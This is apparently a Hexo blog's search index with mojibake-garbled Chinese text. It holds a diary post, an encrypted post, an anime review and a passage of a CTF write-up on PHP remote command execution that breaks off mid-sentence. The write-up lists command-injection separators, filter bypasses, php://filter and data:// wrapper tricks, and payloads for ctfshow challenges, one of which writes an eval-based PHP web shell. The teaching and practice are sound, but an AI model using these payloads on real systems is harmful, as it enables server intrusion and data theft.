<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bye~sophomore</title>
      <link href="/2024/06/26/Bye~sophomore/"/>
      <url>/2024/06/26/Bye~sophomore/</url>
      
        <content type="html"><![CDATA[<p>ç«¯åˆå›æ¥çš„é‚£å¤©ä¸‹åˆä¸å°å¿ƒéª¨æŠ˜äº†ï¼Œåˆšåˆšå®Œæˆäº†è¯¾è®¾ï¼Œé™¤äº†å¼€å­¦çš„ç¼“è€ƒå¤–ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå¤§å­¦ç”Ÿæ´»å·²ç»æ‚„ç„¶è¿‡åŠ</p><p>è¯´èµ·æ¥ä¹ŸæŒºç¢Œç¢Œæ— ä¸ºçš„ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€äº‹æ— æˆï¼Œåªæ˜¯è§‰å¾—è¿˜ä¸å¤Ÿã€‚å¯¹äºæœªæ¥çš„è§„åˆ’ï¼Œå¦ç™½è¯´æˆ‘åªæƒ³è€è€å®å®ä¸Šä¸ªç­èµšé’±ï¼Œå¤§å®¶éƒ½æƒ³èµšå¾—å¤šï¼Œå› ä¸ºè¿™æ ·æ‰æœ‰èµ„æ ¼èµå›å±äºè‡ªå·±çš„ä¸€ç‚¹è‡ªç”±ï¼Œä½†ä¹ŸæŒºè¿·èŒ«ï¼Œå› ä¸ºç¡®å®æ²¡æƒ³å¥½å…·å…·ä½“ä½“çš„æ–¹å‘ã€‚</p><blockquote><p>ç©ºè™šçš„å‹‰åŠ±å’Œæ²¹è…»çš„é¸¡æ±¤ä¸€æ ·ä»¤æˆ‘åèƒƒï¼Œå¦‚æœä¸€ä¸ªäººèƒ½è½»æ˜“åœ°é€šè¿‡å‡ å¥æ–‡å­—å¾—åˆ°åè¶³çš„åŠ¨åŠ›ï¼Œè¿™ä¸ªäººææ€•ä¹Ÿå•çº¯æ— è„‘è€Œæ˜“äºå—åˆ°åˆ©ç”¨ï¼›è€Œè¿œå¤§æ·±åˆ»çœŸæ­£æœ‰æ•ˆçš„æ¿€åŠ±ï¼Œå´æ˜¯ä¸€æ®µè¯æ— æ³•è¡¨è¾¾ã€è¡¨è¾¾åä¹Ÿæ— æ‰€è£¨ç›Šçš„ï¼šå†™å‡ºæ¥åªæ˜¯ç»™åˆ«äººçœ‹çš„è¡¨å†³å¿ƒï¼Œåˆä¸èƒ½æ·±åŒ–è¿™ä¸€æ¿€åŠ±ã€‚è¿™ä¸€ç±»çš„æ–‡å­—ï¼Œè¦ä¹ˆåªæ˜¯æµäºå½¢å¼çš„æ•·è¡ï¼Œè¦ä¹ˆå°±æ˜¯æµ…è–„çš„è¡¨éœ²ã€‚</p></blockquote><p>æ€»ä¹‹è¿˜å¾—å»åšå§ï¼Œç©ºæƒ³å€’ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œæˆ‘å†™è¿™äº›ä¸œè¥¿ä¸çŸ¥é“è¦ç»™è°çœ‹ï¼Œä¹Ÿä¸çŸ¥é“è°ä¼šçœ‹åˆ°ï¼Œæˆ‘è¡¨è¾¾èƒ½åŠ›ä¸€å‘å¾ˆå¼±ï¼Œæ€»è§‰å¾—æ˜¯è¯»çš„ä¹¦å¤ªå°‘ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æƒ³ç€è‡ªå·±å†™çš„è¿™ç‚¹ä¸œè¥¿èƒ½ç»™åˆ«äººå¸¦æ¥ä»€ä¹ˆï¼Œå°±æƒ³è®°å½•ä¸€ä¸‹å§ã€‚</p><p>æƒ³äº†å¥½å¤šï¼Œè¿˜æ˜¯ç®—äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯èƒ½çœŸçš„è¦ç­‰å¥½ä¹…äº†</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="273bb77f9328bef82453701e6bc0d3d6c144754887ce5498775152f7f7f4cfd4">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448a68ca1c5a23f5811f80ca48e10a7371290c41b3fc18049e36ac3d5d03e2bd384d3ff30ebeb7ae3bf1342bffc0d3aaffb74055573a994bad4e144f364e38fdf17a33eca45bd9683f8fef25df85ff80e1c7ae6b2c221c138376090209a1de2aa3e45e9ee0152ac7d139e0d9a343060627652fe73e962a8d389bb7a20bb4e2ad60bb69f8d88dcdddb51658070fcbfda9fb4e3bf457c56e450140d68fe1e9665cdc7796bc3fe44c044d33dbd5fbc15c2867fdf9803d770c5796c13e1c6720692c27e64aa73943960527e1880c9c8c363cedf8fc60ba865a5514b5b377361e6c5b4711109a9e757cfbeba227fece3d1749a22bd40af370efe8e1a654f793922d2ad3d01e203ecba68901b6ba28eef7018f4ff0ab17cd034bc25831f97f2805815b1c119e0652555a9ebbed3a14c81e74a026fbf6c4a032ed0d0a4560498737ce6da6f0c86e72aa5530ca975c25581639d1d2074f5624897a841d34cef0df49b38ca2c332a3f1cef8f20996940c6c64e0936e30c989c13893d36a58f96bddcbabba088e15249f83f56e699e83648eaf91c3c4a80031c362035aae38e1ba742f97a63901c1f4317d2dceb7981c4dfb12af0b387d6160b9ecdee8fa5e5883d6f8a3858c4601ef460870cd59858a498f110755c73371ee33d6e1c654fa7588c4ef5316ed8ace5aeb5cc7052a8692aa1faded6ef40afad75b80a959fd0bd4ec1cf6d2f919430fb72ca6acc3731f9120d4818e7d5b06ec33345e99d2e2667e1a3ffaccdee37062682361a9fd69e8782cf6441af861c00ddb3a86605645b72ec9c9b2b3b49516920415aec03585de463392f983f7e40d3bba4f9cbdf4b5c0556672df2dca507572db023f740ced0ebee76b24849e5d2f9906ccb822147b142c335c1aa5c12dd2f5f0a2a9abd40fc24a73b225b4de2e5464c93ae54c5dd73bad488a1d33f9e3596d4d2c823fd205ef61ed6c1812689297c288e070e36387128f57b10b4e5688a960c16bc34e6764aa82f51bd9946b4b88cdc2cca381516d96ac501591a7f1df29e6da1d89a5797461deca217ccf097d5b33472afc9a6f962fa08aedfa3af93499ac0761c6ead0e1f634dcccc9f8bc37bf9753db02ef2e789ac638735d4ec1886a79695bb9e3853f80cf02051ec9ff73bd78ae8041117943b4ebda3853e3fafe42b5ff80aac6e337cd74d618816edf0f5774b10ec0a71a14885abd18dbd31c556e8edf5e990c68bd838daa1b828b8343074cc4924b8c627759f8f4a4d94b730494fb0c7a9b00640ab6aa8e0d9d9c84804213f65be94d977f83ce4abedf37347516ffba491567ffc0cafb400ab2d17fa453a874c0abbbe9a22f7955adb4914691964e89d862a030f19956db0d789ba50b4d4544dc223a16d0e77c3108ef64900d99f0a266514d2a5140364d8156f76b578588fd012f7eac682693322d6dceb969a873419adfc7e9f0eb63d026d0d3891a096d91af7c42463a120b3d2c1b1265d53f248775873fefcd706781d303b9729b63bc31674942fde1e37f279b19c663e362435a974b8acae0f3cc5b87741ac713a1fa13ee48dddcdcca7f1585c9b98961b0827e903f83c60f6e650d019018fc612c94a72a603e2f5c5ade0b0a6241d0e951b439759d7bb95ea5bcb544ff8a74972d9f894a6dfac0127374ca6e7305b6728f80f3696c978b71d2ebd74426ce7afe4c7f1f26056327bc0c4d2e87219cfe72ac67d06e47e0597db881b2ab70996545e99ea5dccc37d221fcf6da99a4acf1ec102af4dd5eb728a1ff0c6ecd01bee54f4292fdecad591d80789acddb78b00cb439a564f4b5b611f52ca86562bc184c30abea2a18027e2471acf836bc7bee5cd1c183767567fdedda2e385402f5c085b146d8cf36f644947b4d969a9548fdc395b63b155b71877bd3e46bb24888205870ce473f93de7511dbd0b2ba23e8d99bafecb85d14acbeac4d708cfd7a266a971fe1ef9142422da4208160bc396a805b0ccb995d1527d1d9c66e7ef7d5972493918fef0bfec61f2afb3c3d493a98ee4389f83a1a27311449a9d59e7600ae9fae4d3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¢ç¢å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucyå¸¦Davidç¬¬ä¸€æ¬¡æ¥æœˆçƒ</em></p><p>ä¹‹å‰æœ‰å¾ˆå¤šæœ‹å‹å®‰åˆ©è¿‡ï¼Œçœ‹åˆ°å¾ˆå¤šåŒå­¦å–œæ¬¢è¿™ä¸ªåŠ¨æ¼«ï¼Œçœ‹å®Œåä¸å‡ºæ„æ–™çš„éå¸¸å¥½çœ‹ </p><p>æœ€æ‰“åŠ¨æˆ‘çš„å½“ç„¶æ˜¯Lucyå’ŒDavidï¼ŒDavidä»ç¬¬ä¸€æ¬¡è¢«Lucyå¸¦è¿›æœˆçƒï¼Œå°±ä¸€ç›´è®°å¾—Lucyæœ€æƒ³å»æœˆçƒäº†ï¼ŒLucyä¸ºäº†ä¿æŠ¤Davidä¸€ç›´åœ¨ä¸é¡¾å±é™©çš„é»˜é»˜çš„ä»˜å‡ºï¼Œå°½ç®¡æœ€åå¹¶ä¸æ˜¯å®Œç¾çš„ç»“å±€ï¼Œä¸è¿‡æ„ŸåŠ¨æˆ‘çš„æ˜¯ä»–ä»¬å­˜åœ¨äºç»†ææœ«èŠ‚çš„æ¸©æŸ”ã€‚</p><p>å½“ç„¶ï¼Œä¸æ­¢ä»–ä»¬ï¼Œè¿˜æœ‰å¾ˆå¤šä»¤äººéš¾å¿˜çš„è§’è‰²å’Œå‡ºè‰²ç‹¬ç‰¹èƒŒæ™¯è®¾å®šã€‚</p><p>åœ¨å¤§å¤šæ•°ç§‘æŠ€è¢«é¡¶å±‚å„æ–­çš„æ—¶å€™ï¼Œæ¯ä¸ªäººéƒ½ç”Ÿæ´»åœ¨ç›‘æ§ä¹‹ä¸‹ï¼Œä»–ä»¬æ˜¯ä¸€ç¾¤æ¸¸ç¦»åœ¨ç¤¾ä¼šåº•å±‚å’ŒåŸå¸‚è¾¹ç¼˜çš„<em><strong>èµ›åšæœ‹å…‹</strong></em>ï¼Œä»–ä»¬çš„æ¢¦æƒ³å¯èƒ½æ˜¯è‡ªç”±å§ï¼Œä¸è¿‡æ¸´æ±‚è‡ªç”±ä¼¼ä¹å¤ªè¿‡å¥¢æœ›ï¼Œä¸è¿‡ä»–ä»¬ä»¥åŠå¾ˆå¤šä¼™ä¼´éƒ½æœ‰ç€å±äºCyberpunkçš„æµªæ¼«</p><p>åŠ¨æ¼«ä¸­çš„Bgmä¹ŸåŒæ ·å¥½å¬ï¼š<em>I Really Want to Stay at Your House</em></p><p><strong>ä¸€äº›å£çº¸â†“â†“â†“</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="Davidå’ŒLucyğŸ¥°" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>Davidçš„éº»éº»ğŸ˜­</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>éå¸¸å¯çˆ±çš„å°å¥³å­©</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>å¤§åˆç…§</em></p><p><strong>è¿™ä¸ªä¸–ç•Œä¸Šæ²¡æœ‰ä»»ä½•äººèƒ½å®Œå…¨ä¿¡ä»»ï¼Œé™¤äº†ä½ è‡ªå·±ã€‚</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>å¯¹ä¸èµ·ï¼Œæˆ‘ä»¬ä¸èƒ½ä¸€èµ·ä¸Šæœˆçƒäº†ã€‚</strong></p><p><img src="11.png" loading="lazy"><em>Davidçš„é—è¨€ğŸ˜­ğŸ˜­ğŸ˜­</em></p><p><strong>èµ›åšæœ‹å…‹ä¸éƒ½æ˜¯åœ¨é€ƒé¿æŸç§å¯è€»äººç”Ÿçš„é€ƒéš¾è€…ï¼Œæˆ–æ˜¯æŠ±ç€é¥è¿œå¿—å‘è€Œè¿·å¤±è‡ªæˆ‘çš„é€æ¢¦è€…å— ï¼Ÿ</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>é…·é…·çš„kiwi</em></p><p><strong>å›é¡¾è¿‡å»æ²¡æœ‰æ„ä¹‰ã€‚</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZrce</title>
      <link href="/2024/06/03/EZrce/"/>
      <url>/2024/06/03/EZrce/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><h4 id="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"><a href="#ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿" class="headerlink" title="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"></a>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé…åˆphpä¼ªåè®®)</p><h4 id="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼</h4><h5 id="Windowsæ”¯æŒï¼š"><a href="#Windowsæ”¯æŒï¼š" class="headerlink" title="Windowsæ”¯æŒï¼š"></a>Windowsæ”¯æŒï¼š</h5><p>|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami<br>||å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%1a ä½œä¸º.batæ–‡ä»¶çš„å‘½ä»¤åˆ†éš”ç¬¦</p><h5 id="Linuxæ”¯æŒ"><a href="#Linuxæ”¯æŒ" class="headerlink" title="Linuxæ”¯æŒ:"></a>Linuxæ”¯æŒ:</h5><p>;å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„ ping 127.0.0.1;whoami<br>|ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami<br>||å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%0d æ¢è¡Œ</p><h5 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h5><p>ä½¿ç”¨&lt;ä»£æ›¿ç©ºæ ¼</p><p>ä½¿ç”¨${IFS}ä»£æ›¿ç©ºæ ¼</p><blockquote><p>IFSå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼š</p><ul><li>ShellæŠŠå˜é‡IFSå†…çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½å½“åšæ˜¯ä¸€ä¸ªåˆ†å‰²ç¬¦(delimeter)ï¼Œç”¨è¿™äº›å­—ç¬¦ä½œä¸ºæ¯ä¸€ä¸ªå­—æ®µçš„ç»“æŸç¬¦æ¥è¿›è¡Œåˆ†å‰²ã€‚</li><li>å¦‚æœIFSæ²¡æœ‰è®¾ç½®ï¼Œæˆ–è€…IFSçš„å€¼è¢«è®¾ç½®ä¸ºâ€\t\nâ€(space, tabå’Œ newline)ï¼Œé‚£ä¹ˆæ“ä½œå¯¹è±¡çš„å¼€å§‹å’Œç»“æŸå¤„çš„æ‰€æœ‰space, tabå’Œnewlineåºåˆ—éƒ½å°†è¢«å¿½ç•¥ï¼Œä½†æ˜¯æ“ä½œå¯¹è±¡ä¸­é—´çš„space, tabå’Œnewlineåºåˆ—ä¼šä½œä¸ºç•Œå®šç¬¦å·¥ä½œã€‚</li><li>å¦‚æœIFSå€¼ä¸æ˜¯é»˜è®¤å€¼(ä¾‹å¦‚ç¨‹åºä¸­å¯¹IFSè¿›è¡Œè®¾ç½®è¿‡)ï¼Œåªæœ‰å‡ºç°åœ¨IFSå†…çš„ç©ºç™½å­—ç¬¦(å¯èƒ½æ˜¯space, tabæˆ–newlineä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ª)æ‰ä¼šåœ¨å•è¯å¼€å§‹å’Œç»“æŸå¤„è¢«å¿½ç•¥ï¼Œè¿™é‡Œè¯´çš„æ˜¯å•è¯ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ“ä½œå¯¹è±¡ã€‚</li><li>IFSå†…çš„éç©ºç™½å­—ç¬¦å¤šä¸ªè¿ç»­å‡ºç°æ—¶ï¼Œæ¯ä¸ªéç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšå•ç‹¬çš„åˆ†éš”ç¬¦çœ‹å¾…ï¼Œä½†æ˜¯å¤šä¸ªè¿ç»­çš„ç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšä¸€ä¸ªåˆ†éš”ç¬¦çœ‹å¾…ã€‚</li><li>å¦‚æœIFSä¸ºç©º(â€œnullâ€)ï¼Œåˆ™ä¸ä¼šè¿›è¡Œå•è¯åˆ†å‰²ã€‚</li></ul></blockquote><p>ä½¿ç”¨$IFSä»£æ›¿ç©ºæ ¼</p><h5 id="è¿‡æ»¤æ–œæ -ç»•è¿‡"><a href="#è¿‡æ»¤æ–œæ -ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡"></a>è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡</h5><p>ä½¿ç”¨${HOME:0:1}ä»£æ›¿</p><h5 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h5><p>PHP ä¼ªåè®®æ˜¯ PHP æ”¯æŒçš„åè®®ä¸å°è£…åè®®ï¼Œå‡ ä¸ª PHP æ”¯æŒçš„ä¼ªåè®®å¦‚ä¸‹ã€‚</p><table><thead><tr><th>ä¼ªåè®®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>è®¿é—® HTTP(s) ç½‘å€</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP å½’æ¡£</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>å‹ç¼©æµ</td></tr></tbody></table><p>ä¾‹å¦‚åœ¨ allow_url_include &#x3D; on æ—¶æœåŠ¡å™¨ä¸Šæœ‰ä¸ªæ–‡ä»¶å« index.phpï¼Œä¸”å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½ç”¨ php ä¼ªåè®®ç›´æ¥æŠŠæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>ç¨å¾®è§£é‡Šä¸‹è¿™ä¸ªåšæ³•ï¼Œphp:&#x2F;&#x2F;filter&#x2F; æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F; è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯ base64 ç¼–ç åï¼Œresource&#x3D;index.php è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚é—®ä»€ä¹ˆè¦è¿›è¡Œ base64 ç¼–ç å‘¢ï¼Ÿå¦‚æœä¸è¿›è¡Œ base64 ç¼–ç ä¼ å…¥ï¼Œindex.php å°±ä¼šç›´æ¥æ‰§è¡Œï¼Œæˆ‘ä»¬å°±çœ‹ä¸åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹äº†ã€‚php åè®®è¿˜å¸¸ç”¨ php:&#x2F;&#x2F;inputï¼Œè¿™å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å– POST è¯·æ±‚çš„å‚æ•°ã€‚</p><h5 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data ä¼ªåè®®"></a>data ä¼ªåè®®</h5><p>php 5.2.0 èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºæ•°æ®æµçš„è¯»å–ï¼Œå¦‚æœä¼ å…¥çš„æ•°æ®æ˜¯PHPä»£ç å°±ä¼šæ‰§è¡Œä»£ç ã€‚ä½¿ç”¨æ–¹æ³•ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</span><br></pre></td></tr></table></figure><h5 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h5><p>1.tee ä»æ ‡å‡†è¾“å…¥è¯»å–ï¼Œå†å†™å…¥æ ‡å‡†è¾“å‡ºå’Œæ–‡ä»¶ã€‚</p><p>2.åå¼¹shell</p><p>3.dnslogå¤–å¸¦</p><h5 id="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"><a href="#ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡" class="headerlink" title="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"></a>ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡</h5><p> è¿™ä¸ªæ­£åˆ™çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯åˆ©ç”¨ç‰¹æ€§æ¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨</p><p>ã€€[</p><p> (ç©ºæ ¼)</p><p> + ã€€</p><p> .</p><p>ä¸Šé¢é‚£å‡ ä¸ªå­—ç¬¦ä»»ä½•ä¸€ä¸ªéƒ½è¡Œï¼Œéƒ½å¯ä»¥è¢«å¤„ç†æˆ_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>åªæ˜¯è¿‡æ»¤äº†ç®€å•çš„flagå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨systemå‡½æ•°</p><p>Payload:</p><blockquote><p>1ã€ç”¨egrepæ•ˆæœä¸€æ ·egrep&#x3D;grep  -E<br>c&#x3D;system(â€œcat fl<em>g.php | grep  -E â€˜fl.gâ€™ â€œ);<br>2ã€æ­¤ç§æ–¹å¼éœ€è¦å³é”®æºä»£ç <br>c&#x3D;system(â€œcat fl</em>g.phpâ€);<br>3ã€</p><p>c&#x3D;system(â€œtac fl<em>g.phpâ€);<br>4ã€å€’åºè¾“å‡ºæ–‡æœ¬<br>c&#x3D;system(â€œtac fl</em>ag.phpâ€);<br>5ã€<br>c&#x3D;system(â€œcp fl*g.php a.txt â€œ);<br>è®¿é—®&#x2F;a.txt<br>6ã€ç›´æ¥è¾“å‡ºä¸€ä¸ªphpè¿™æ ·å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ä»£ç äº†,æ³¨æ„ä¹Ÿæ˜¯å³é”®æŸ¥çœ‹æºä»£ç <br>c&#x3D;system(â€˜echo -e â€œ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); â€œ &gt; a.phpâ€™);<br>&#x2F;a.php?c&#x3D;system(â€œtac flag.phpâ€);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>è¿‡æ»¤äº†systemå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ¥å‘½ä»¤æ‰§è¡Œ</p><p>Payload:</p><blockquote><p>1ã€nlå‘½ä»¤ï¼Œå¸¦ç€è¡Œå·è¾“å‡ºæ–‡æœ¬å†…å®¹<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>å•å¼•å·ï¼šå¼•å·é‡Œé¢çš„å†…å®¹ä¼šåŸå°ä¸åŠ¨çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆå¾ˆç®€å•ï¼Œä¸åšè§£é‡Šï¼‰<br>åŒå¼•å·ï¼šé‡Œé¢çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è§£æï¼Œå˜é‡ä¹Ÿä¼šè¢«æ›¿æ¢ï¼ˆ\ ç¬¦å·ã€ç©ºæ ¼ä¼šè¢«è§£æï¼‰<br>echo \a -&gt; a<br>echo â€œ\aâ€ -&gt; \a<br>2ã€passthruå‡½æ•°ï¼ŒåŒsystemï¼ŒåŒç†execï¼Œshell_execä¹Ÿå¯ä»¥ç”¨ï¼Œä¸è¿‡æœ‰ç‚¹éº»çƒ¦<br>c&#x3D;passthru(â€œcat fla*â€);<br>c&#x3D;exec(passthru(â€œcat fla*â€));<br>c&#x3D;shell_exec(passthru(â€œcat fla*â€));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>é¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå•å¼•å·ï¼Œå°æ•°ç‚¹ï¼Œ</p><p>è¿‡æ»¤äº†ç©ºæ 